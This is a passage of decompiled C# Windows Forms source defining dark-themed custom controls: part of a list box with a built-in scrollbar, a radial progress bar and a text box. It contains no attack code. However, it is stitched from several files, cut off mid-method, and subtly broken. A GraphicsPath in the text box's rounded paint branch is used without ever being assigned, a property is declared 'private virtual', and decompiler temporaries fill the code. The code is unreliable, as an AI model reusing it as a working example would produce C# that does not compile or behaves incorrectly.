		[Category("Colours")]
		public Color NonSelectedItemColour
		{
			get
			{
				return this._NonSelectedItemColour;
			}
			set
			{
				this._NonSelectedItemColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Control")]
		public int SelectedHeight
		{
			get
			{
				return this._SelectedHeight;
			}
		}

		[Category("Control")]
		public int SelectedWidth
		{
			get
			{
				return this._SelectedWidth;
			}
		}

		[Category("Control")]
		public bool DontShowInnerScrollbarBorder
		{
			get
			{
				return this._DontShowInnerScrollbarBorder;
			}
			set
			{
				this._DontShowInnerScrollbarBorder = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool ShowWholeInnerBorder
		{
			get
			{
				return this._ShowWholeInnerBorder;
			}
			set
			{
				this._ShowWholeInnerBorder = value;
				this.Invalidate();
			}
		}

		[Category("Control"), DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		public VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem[] Items
		{
			get
			{
				return this._Items.ToArray();
			}
			set
			{
				this._Items = new List<VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem>(value);
				this.Invalidate();
				this.InvalidateScroll();
			}
		}

		[Category("Control")]
		public VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem[] SelectedItems
		{
			get
			{
				return this._SelectedItems.ToArray();
			}
		}

		[Category("Control")]
		public bool MultiSelect
		{
			get
			{
				return this._MultiSelect;
			}
			set
			{
				this._MultiSelect = value;
				bool flag = this._SelectedItems.Count > 1;
				if (flag)
				{
					this._SelectedItems.RemoveRange(1, checked(this._SelectedItems.Count - 1));
				}
				this.Invalidate();
			}
		}

		public override Font Font
		{
			get
			{
				return base.Font;
			}
			set
			{
				this.ItemHeight = checked((int)Math.Round((double)Graphics.FromHwnd(this.Handle).MeasureString("@", this.Font).Height));
				bool flag = this.VerticalScrollbar != null;
				if (flag)
				{
					this.VerticalScrollbar._SmallChange = 1;
					this.VerticalScrollbar._LargeChange = 1;
				}
				base.Font = value;
				this.InvalidateLayout();
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VisualStudioListBoxWBuiltInScrollBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VisualStudioListBoxWBuiltInScrollBar.__ENCList.Count == VisualStudioListBoxWBuiltInScrollBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = VisualStudioListBoxWBuiltInScrollBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = VisualStudioListBoxWBuiltInScrollBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									VisualStudioListBoxWBuiltInScrollBar.__ENCList[num] = VisualStudioListBoxWBuiltInScrollBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						VisualStudioListBoxWBuiltInScrollBar.__ENCList.RemoveRange(num, VisualStudioListBoxWBuiltInScrollBar.__ENCList.Count - num);
						VisualStudioListBoxWBuiltInScrollBar.__ENCList.Capacity = VisualStudioListBoxWBuiltInScrollBar.__ENCList.Count;
					}
					VisualStudioListBoxWBuiltInScrollBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		private void HandleScroll(object sender)
		{
			this.Invalidate();
		}

		private void InvalidateScroll()
		{
			checked
			{
				bool flag = (double)((int)Math.Round(Math.Round((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight))) < (double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight;
				if (flag)
				{
					this.VerticalScrollbar._Maximum = (int)Math.Round(Math.Ceiling((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight));
				}
				else
				{
					flag = ((int)Math.Round(Math.Round((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight)) == 0);
					if (flag)
					{
						this.VerticalScrollbar._Maximum = 1;
					}
					else
					{
						this.VerticalScrollbar._Maximum = (int)Math.Round(Math.Round((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight));
					}
				}
				this.Invalidate();
			}
		}

		private void InvalidateLayout()
		{
			Control arg_25_0 = this.VerticalScrollbar;
			checked
			{
				Point location = new Point(this.Width - this.VerticalScrollbar.Width - 2, 2);
				arg_25_0.Location = location;
				Control arg_44_0 = this.VerticalScrollbar;
				Size size = new Size(18, this.Height - 4);
				arg_44_0.Size = size;
				this.Invalidate();
			}
		}

		public void AddItem(string Items)
		{
			VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem vSListBoxItem = new VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem();
			vSListBoxItem.Text = Items;
			this._Items.Add(vSListBoxItem);
			this.Invalidate();
			this.InvalidateScroll();
		}

		public void AddItems(string[] Items)
		{
			checked
			{
				for (int i = 0; i < Items.Length; i++)
				{
					string text = Items[i];
					VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem vSListBoxItem = new VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem();
					vSListBoxItem.Text = text;
					this._Items.Add(vSListBoxItem);
				}
				this.Invalidate();
				this.InvalidateScroll();
			}
		}

		public void RemoveItemAt(int index)
		{
			this._Items.RemoveAt(index);
			this.Invalidate();
			this.InvalidateScroll();
		}

		public void RemoveItem(VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem item)
		{
			this._Items.Remove(item);
			this.Invalidate();
			this.InvalidateScroll();
		}

		public void RemoveItems(VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem[] items)
		{
			checked
			{
				for (int i = 0; i < items.Length; i++)
				{
					VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem item = items[i];
					this._Items.Remove(item);
				}
				this.Invalidate();
				this.InvalidateScroll();
			}
		}

		protected override void OnSizeChanged(EventArgs e)
		{
			this._SelectedWidth = this.Width;
			this._SelectedHeight = this.Height;
			this.InvalidateScroll();
			this.InvalidateLayout();
			base.OnSizeChanged(e);
		}

		private void Vertical_MouseDown(object sender, MouseEventArgs e)
		{
			this.Focus();
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			this.Focus();
			bool flag = e.Button == MouseButtons.Left;
			checked
			{
				if (flag)
				{
					int num = this.VerticalScrollbar.Value * (this.VerticalScrollbar.Maximum + (this.Height - this.ItemHeight));
					int num2 = (e.Y + num) / this.ItemHeight;
					flag = (num2 > this._Items.Count - 1);
					if (flag)
					{
						num2 = -1;
					}
					flag = (num2 != -1);
					if (flag)
					{
						bool flag2 = Control.ModifierKeys == Keys.Control && this._MultiSelect;
						if (flag2)
						{
							bool flag3 = this._SelectedItems.Contains(this._Items[num2]);
							if (flag3)
							{
								this._SelectedItems.Remove(this._Items[num2]);
							}
							else
							{
								this._SelectedItems.Add(this._Items[num2]);
							}
						}
						else
						{
							this._SelectedItems.Clear();
							this._SelectedItems.Add(this._Items[num2]);
						}
					}
					this.Invalidate();
				}
				base.OnMouseDown(e);
			}
		}

		protected override void OnMouseWheel(MouseEventArgs e)
		{
			checked
			{
				int num = 0 - e.Delta * SystemInformation.MouseWheelScrollLines / 120 * 1;
				int value = Math.Max(Math.Min(this.VerticalScrollbar.Value + num, this.VerticalScrollbar.Maximum), this.VerticalScrollbar.Minimum);
				this.VerticalScrollbar.Value = value;
				base.OnMouseWheel(e);
			}
		}

		public VisualStudioListBoxWBuiltInScrollBar()
		{
			VisualStudioListBoxWBuiltInScrollBar.__ENCAddToList(this);
			this._Items = new List<VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem>();
			this._SelectedItems = new List<VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem>();
			this._MultiSelect = true;
			this.ItemHeight = 24;
			this._BaseColour = Color.FromArgb(37, 37, 38);
			this._NonSelectedItemColour = Color.FromArgb(62, 62, 64);
			this._SelectedItemColour = Color.FromArgb(47, 47, 47);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._FontColour = Color.FromArgb(199, 199, 199);
			this._SelectedWidth = 1;
			this._SelectedHeight = 1;
			this._DontShowInnerScrollbarBorder = false;
			this._ShowWholeInnerBorder = true;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.Selectable | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.VerticalScrollbar = new VisualStudioVerticalScrollBar();
			this.VerticalScrollbar._SmallChange = 1;
			this.VerticalScrollbar._LargeChange = 1;
			this.VerticalScrollbar.Scroll += new VisualStudioVerticalScrollBar.ScrollEventHandler(this.HandleScroll);
			this.VerticalScrollbar.MouseDown += new MouseEventHandler(this.Vertical_MouseDown);
			this.Controls.Add(this.VerticalScrollbar);
			this.InvalidateLayout();
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this._BaseColour);
			checked
			{
				int num = this.VerticalScrollbar.Value * (this.VerticalScrollbar.Maximum + (this.Height - this.ItemHeight));
				bool flag = num == 0;
				int num2;
				if (flag)
				{
					num2 = 0;
				}
				else
				{
					num2 = num / this.ItemHeight / this.VerticalScrollbar.Maximum;
				}
				int num3 = Math.Min(num2 + this.Height / this.ItemHeight, this._Items.Count - 1);
				flag = (!this._DontShowInnerScrollbarBorder && !this._ShowWholeInnerBorder);
				if (flag)
				{
					graphics2.DrawLine(new Pen(this._BorderColour, 2f), this.VerticalScrollbar.Location.X - 1, 0, this.VerticalScrollbar.Location.X - 1, this.Height);
				}
				int arg_11A_0 = num2;
				int num4 = this._Items.Count - 1;
				int num5 = arg_11A_0;
				while (true)
				{
					int arg_35A_0 = num5;
					int num6 = num4;
					if (arg_35A_0 > num6)
					{
						break;
					}
					VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem vSListBoxItem = this.Items[num5];
					int num7 = num5 * this.ItemHeight + 1 - num + (int)Math.Round(unchecked((double)this.ItemHeight / 2.0 - 8.0));
					flag = this._SelectedItems.Contains(vSListBoxItem);
					if (flag)
					{
						Graphics arg_1A4_0 = graphics2;
						Brush arg_1A4_1 = new SolidBrush(this._SelectedItemColour);
						Rectangle rectangle = new Rectangle(0, num5 * this.ItemHeight + 1 - num, this.Width - 19, this.ItemHeight - 1);
						arg_1A4_0.FillRectangle(arg_1A4_1, rectangle);
					}
					else
					{
						Graphics arg_1E3_0 = graphics2;
						Brush arg_1E3_1 = new SolidBrush(this._NonSelectedItemColour);
						Rectangle rectangle = new Rectangle(0, num5 * this.ItemHeight + 1 - num, this.Width - 19, this.ItemHeight - 1);
						arg_1E3_0.FillRectangle(arg_1E3_1, rectangle);
					}
					graphics2.DrawLine(new Pen(this._BorderColour), 0, num5 * this.ItemHeight + 1 - num + this.ItemHeight - 1, this.Width - 18, num5 * this.ItemHeight + 1 - num + this.ItemHeight - 1);
					flag = (graphics2.MeasureString(vSListBoxItem.Text, new Font("Segoe UI", 8f)).Width > (float)(this._SelectedWidth - 30));
					if (flag)
					{
						Graphics arg_2AC_0 = graphics2;
						string arg_2AC_1 = vSListBoxItem.Text;
						Font arg_2AC_2 = new Font("Segoe UI", 8f);
						Brush arg_2AC_3 = new SolidBrush(this._FontColour);
						Rectangle rectangle = new Rectangle(7, num7, this.Width - 35, 15);
						arg_2AC_0.DrawString(arg_2AC_1, arg_2AC_2, arg_2AC_3, rectangle);
						Graphics arg_2F1_0 = graphics2;
						string arg_2F1_1 = "...";
						Font arg_2F1_2 = new Font("Segoe UI", 8f);
						Brush arg_2F1_3 = new SolidBrush(this._FontColour);
						rectangle = new Rectangle(this.Width - 32, num7, 15, 15);
						arg_2F1_0.DrawString(arg_2F1_1, arg_2F1_2, arg_2F1_3, rectangle);
					}
					else
					{
						Graphics arg_33C_0 = graphics2;
						string arg_33C_1 = vSListBoxItem.Text;
						Font arg_33C_2 = new Font("Segoe UI", 8f);
						Brush arg_33C_3 = new SolidBrush(this._FontColour);
						Rectangle rectangle = new Rectangle(7, num7, this.Width - 34, num7 + 10);
						arg_33C_0.DrawString(arg_33C_1, arg_33C_2, arg_33C_3, rectangle);
					}
					graphics2.ResetClip();
					num5++;
				}
				graphics2.DrawRectangle(new Pen(Color.FromArgb(35, 35, 35), 2f), 1, 1, this.Width - 2, this.Height - 2);
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
				flag = this._ShowWholeInnerBorder;
				if (flag)
				{
					graphics2.DrawLine(new Pen(this._BorderColour, 2f), this.VerticalScrollbar.Location.X - 1, 0, this.VerticalScrollbar.Location.X - 1, this.Height);
				}
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class VisualStudioRadialProgressBar : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _BorderColour;

		private Color _BaseColour;

		private Color _ProgressColour;

		private Color _TextColour;

		private int _Value;

		private int _Maximum;

		private int _StartingAngle;

		private int _RotationAngle;

		private Font _Font;

		[Category("Control")]
		public int Maximum
		{
			get
			{
				return this._Maximum;
			}
			set
			{
				bool flag = value < this._Value;
				if (flag)
				{
					this._Value = value;
				}
				this._Maximum = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public int Value
		{
			get
			{
				int value = this._Value;
				bool flag = value == 0;
				int result;
				if (flag)
				{
					result = 0;
				}
				else
				{
					result = this._Value;
				}
				return result;
			}
			set
			{
				int num = value;
				bool flag = num > this._Maximum;
				if (flag)
				{
					value = this._Maximum;
					this.Invalidate();
				}
				this._Value = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color ProgressColour
		{
			get
			{
				return this._ProgressColour;
			}
			set
			{
				this._ProgressColour = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public int StartingAngle
		{
			get
			{
				return this._StartingAngle;
			}
			set
			{
				this._StartingAngle = value;
			}
		}

		[Category("Control")]
		public int RotationAngle
		{
			get
			{
				return this._RotationAngle;
			}
			set
			{
				this._RotationAngle = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VisualStudioRadialProgressBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VisualStudioRadialProgressBar.__ENCList.Count == VisualStudioRadialProgressBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = VisualStudioRadialProgressBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = VisualStudioRadialProgressBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									VisualStudioRadialProgressBar.__ENCList[num] = VisualStudioRadialProgressBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						VisualStudioRadialProgressBar.__ENCList.RemoveRange(num, VisualStudioRadialProgressBar.__ENCList.Count - num);
						VisualStudioRadialProgressBar.__ENCList.Capacity = VisualStudioRadialProgressBar.__ENCList.Count;
					}
					VisualStudioRadialProgressBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public void Increment(int Amount)
		{
			checked
			{
				this.Value += Amount;
			}
		}

		public VisualStudioRadialProgressBar()
		{
			VisualStudioRadialProgressBar.__ENCAddToList(this);
			this._BorderColour = Color.FromArgb(28, 28, 28);
			this._BaseColour = Color.FromArgb(45, 45, 48);
			this._ProgressColour = Color.FromArgb(62, 62, 66);
			this._TextColour = Color.FromArgb(153, 153, 153);
			this._Value = 0;
			this._Maximum = 100;
			this._StartingAngle = 110;
			this._RotationAngle = 255;
			this._Font = new Font("Segoe UI", 20f);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			Size size = new Size(78, 78);
			this.Size = size;
			this.BackColor = Color.Transparent;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Bitmap bitmap = new Bitmap(this.Width, this.Height);
			Graphics graphics = Graphics.FromImage(bitmap);
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.AntiAliasGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this.BackColor);
			int value = this._Value;
			bool flag = value == 0;
			checked
			{
				if (flag)
				{
					graphics2.DrawArc(new Pen(new SolidBrush(this._BorderColour), 7f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle - 3, this._RotationAngle + 5);
					graphics2.DrawArc(new Pen(new SolidBrush(this._BaseColour), 4f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle, this._RotationAngle);
					Graphics arg_156_0 = graphics2;
					string arg_156_1 = Conversions.ToString(this._Value);
					Font arg_156_2 = this._Font;
					Brush arg_156_3 = new SolidBrush(this._TextColour);
					Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round(unchecked((double)this.Height / 2.0 - 1.0)));
					arg_156_0.DrawString(arg_156_1, arg_156_2, arg_156_3, p, new StringFormat
					{
						Alignment = StringAlignment.Center,
						LineAlignment = StringAlignment.Center
					});
				}
				else
				{
					flag = (value == this._Maximum);
					if (flag)
					{
						graphics2.DrawArc(new Pen(new SolidBrush(this._BorderColour), 7f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle - 3, this._RotationAngle + 5);
						graphics2.DrawArc(new Pen(new SolidBrush(this._BaseColour), 4f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle, this._RotationAngle);
						graphics2.DrawArc(new Pen(new SolidBrush(this._ProgressColour), 4f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle, this._RotationAngle);
						Graphics arg_2B1_0 = graphics2;
						string arg_2B1_1 = Conversions.ToString(this._Value);
						Font arg_2B1_2 = this._Font;
						Brush arg_2B1_3 = new SolidBrush(this._TextColour);
						Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round(unchecked((double)this.Height / 2.0 - 1.0)));
						arg_2B1_0.DrawString(arg_2B1_1, arg_2B1_2, arg_2B1_3, p, new StringFormat
						{
							Alignment = StringAlignment.Center,
							LineAlignment = StringAlignment.Center
						});
					}
					else
					{
						graphics2.DrawArc(new Pen(new SolidBrush(this._BorderColour), 7f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle - 3, this._RotationAngle + 5);
						graphics2.DrawArc(new Pen(new SolidBrush(this._BaseColour), 4f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle, this._RotationAngle);
						graphics2.DrawArc(new Pen(new SolidBrush(this._ProgressColour), 4f), 3, 3, this.Width - 3 - 4, this.Height - 3 - 3, this._StartingAngle, (int)Math.Round(unchecked((double)this._RotationAngle / (double)this._Maximum * (double)this._Value)));
						Graphics arg_411_0 = graphics2;
						string arg_411_1 = Conversions.ToString(this._Value);
						Font arg_411_2 = this._Font;
						Brush arg_411_3 = new SolidBrush(this._TextColour);
						Point p = new Point((int)Math.Round((double)this.Width / 2.0), (int)Math.Round(unchecked((double)this.Height / 2.0 - 1.0)));
						arg_411_0.DrawString(arg_411_1, arg_411_2, arg_411_3, p, new StringFormat
						{
							Alignment = StringAlignment.Center,
							LineAlignment = StringAlignment.Center
						});
					}
				}
				base.OnPaint(e);
				e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
				e.Graphics.DrawImageUnscaled(bitmap, 0, 0);
				bitmap.Dispose();
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class VisualStudioNormalTextBox : Control
	{
		public enum Styles
		{
			Rounded,
			NotRounded
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private MouseState State;

		[AccessedThroughProperty("TB")]
		private TextBox _TB;

		private Color _BaseColour;

		private Color _TextColour;

		private Color _BorderColour;

		private VisualStudioNormalTextBox.Styles _Style;

		private HorizontalAlignment _TextAlign;

		private int _MaxLength;

		private bool _ReadOnly;

		private bool _UseSystemPasswordChar;

		private bool _Multiline;

		private virtual TextBox TB
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TB;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TB = value;
			}
		}

		[Category("Options")]
		public HorizontalAlignment TextAlign
		{
			get
			{
				return this._TextAlign;
			}
			set
			{
				this._TextAlign = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.TextAlign = value;
				}
			}
		}

		[Category("Options")]
		public int MaxLength
		{
			get
			{
				return this._MaxLength;
			}
			set
			{
				this._MaxLength = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.MaxLength = value;
				}
			}
		}

		[Category("Options")]
		public bool ReadOnly
		{
			get
			{
				return this._ReadOnly;
			}
			set
			{
				this._ReadOnly = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.ReadOnly = value;
				}
			}
		}

		[Category("Options")]
		public bool UseSystemPasswordChar
		{
			get
			{
				return this._UseSystemPasswordChar;
			}
			set
			{
				this._UseSystemPasswordChar = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.UseSystemPasswordChar = value;
				}
			}
		}

		[Category("Options")]
		public bool Multiline
		{
			get
			{
				return this._Multiline;
			}
			set
			{
				this._Multiline = value;
				bool flag = this.TB != null;
				checked
				{
					if (flag)
					{
						this.TB.Multiline = value;
						if (value)
						{
							this.TB.Height = this.Height - 7;
						}
						else
						{
							this.Height = this.TB.Height + 7;
						}
					}
				}
			}
		}

		[Category("Options")]
		public override string Text
		{
			get
			{
				return base.Text;
			}
			set
			{
				base.Text = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.Text = value;
				}
			}
		}

		[Category("Options")]
		public override Font Font
		{
			get
			{
				return base.Font;
			}
			set
			{
				base.Font = value;
				bool flag = this.TB != null;
				checked
				{
					if (flag)
					{
						this.TB.Font = value;
						Control arg_37_0 = this.TB;
						Point location = new Point(3, 5);
						arg_37_0.Location = location;
						this.TB.Width = this.Width - 6;
						flag = !this._Multiline;
						if (flag)
						{
							this.Height = this.TB.Height + 7;
						}
					}
				}
			}
		}

		public VisualStudioNormalTextBox.Styles Style
		{
			get
			{
				return this._Style;
			}
			set
			{
				this._Style = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color BackgroundColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VisualStudioNormalTextBox.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VisualStudioNormalTextBox.__ENCList.Count == VisualStudioNormalTextBox.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = VisualStudioNormalTextBox.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = VisualStudioNormalTextBox.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									VisualStudioNormalTextBox.__ENCList[num] = VisualStudioNormalTextBox.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						VisualStudioNormalTextBox.__ENCList.RemoveRange(num, VisualStudioNormalTextBox.__ENCList.Count - num);
						VisualStudioNormalTextBox.__ENCList.Capacity = VisualStudioNormalTextBox.__ENCList.Count;
					}
					VisualStudioNormalTextBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnCreateControl()
		{
			base.OnCreateControl();
			bool flag = !this.Controls.Contains(this.TB);
			if (flag)
			{
				this.Controls.Add(this.TB);
			}
		}

		private void OnBaseTextChanged(object s, EventArgs e)
		{
			this.Text = this.TB.Text;
		}

		private void OnBaseKeyDown(object s, KeyEventArgs e)
		{
			bool flag = e.Control && e.KeyCode == Keys.A;
			if (flag)
			{
				this.TB.SelectAll();
				e.SuppressKeyPress = true;
			}
			flag = (e.Control && e.KeyCode == Keys.C);
			if (flag)
			{
				this.TB.Copy();
				e.SuppressKeyPress = true;
			}
		}

		protected override void OnResize(EventArgs e)
		{
			Control arg_12_0 = this.TB;
			Point location = new Point(5, 5);
			arg_12_0.Location = location;
			checked
			{
				this.TB.Width = this.Width - 10;
				bool multiline = this._Multiline;
				if (multiline)
				{
					this.TB.Height = this.Height - 7;
				}
				else
				{
					this.Height = this.TB.Height + 7;
				}
				base.OnResize(e);
			}
		}

		public void SelectAll()
		{
			this.TB.Focus();
			this.TB.SelectAll();
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			this.State = MouseState.Down;
			this.Invalidate();
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.State = MouseState.Over;
			this.TB.Focus();
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		public VisualStudioNormalTextBox()
		{
			VisualStudioNormalTextBox.__ENCAddToList(this);
			this.State = MouseState.None;
			this._BaseColour = Color.FromArgb(51, 51, 55);
			this._TextColour = Color.FromArgb(153, 153, 153);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._Style = VisualStudioNormalTextBox.Styles.NotRounded;
			this._TextAlign = HorizontalAlignment.Left;
			this._MaxLength = 32767;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = Color.Transparent;
			this.TB = new TextBox();
			this.TB.Height = 20;
			this.TB.Font = new Font("Segoe UI", 10f);
			this.TB.Text = this.Text;
			this.TB.BackColor = this._BaseColour;
			this.TB.ForeColor = this._TextColour;
			this.TB.MaxLength = this._MaxLength;
			this.TB.Multiline = false;
			this.TB.ReadOnly = this._ReadOnly;
			this.TB.UseSystemPasswordChar = this._UseSystemPasswordChar;
			this.TB.BorderStyle = BorderStyle.None;
			Control arg_158_0 = this.TB;
			Point location = new Point(5, 5);
			arg_158_0.Location = location;
			this.TB.Width = checked(this.Width - 35);
			this.TB.TextChanged += new EventHandler(this.OnBaseTextChanged);
			this.TB.KeyDown += new KeyEventHandler(this.OnBaseKeyDown);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this.BackColor);
			this.TB.BackColor = this._BaseColour;
			this.TB.ForeColor = this._TextColour;
			switch (this._Style)
			{
			case VisualStudioNormalTextBox.Styles.Rounded:
			{
				GraphicsPath graphicsPath;
				graphics2.FillPath(new SolidBrush(Color.FromArgb(42, 42, 42)), graphicsPath);
				graphics2.DrawPath(new Pen(new SolidBrush(Color.FromArgb(35, 35, 35)), 2f), graphicsPath);
				graphicsPath.Dispose();
				break;
			}
			case VisualStudioNormalTextBox.Styles.NotRounded:
			{
				Graphics arg_F3_0 = graphics2;
				Brush arg_F3_1 = new SolidBrush(this._BaseColour);
				Rectangle rect = checked(new Rectangle(0, 0, this.Width - 1, this.Height - 1));
				arg_F3_0.FillRectangle(arg_F3_1, rect);
				Graphics arg_127_0 = graphics2;
				Pen arg_127_1 = new Pen(Color.FromArgb(63, 63, 70), 2f);
				rect = new Rectangle(0, 0, this.Width, this.Height);
				arg_127_0.DrawRectangle(arg_127_1, rect);
				break;
			}
			}
